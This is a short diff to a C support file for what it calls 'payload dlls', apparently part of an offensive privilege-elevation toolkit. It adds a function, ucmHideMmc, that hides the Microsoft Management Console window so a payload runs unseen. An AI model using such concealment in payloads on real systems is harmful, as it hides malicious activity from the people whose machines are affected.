@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.71
 *
-*  DATE:        21 Jul 2026
+*  DATE:        23 Jul 2026
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -2708,4 +2708,22 @@ BOOL ucmStartLockedElevatedProcess(
     }
 
     return bResult;
+}
+
+/*
+* ucmHideMmc
+*
+* Purpose:
+*
+* Hide MS console window. Must run from mmc itself.
+*
+*/
+BOOL ucmHideMmc()
+{
+    HWND hwnd = FindWindow(T_MMC_WND_CLASS, NULL);
+    if (hwnd) {
+        return ShowWindow(hwnd, SW_HIDE);
+    }
+
+    return FALSE;
 }
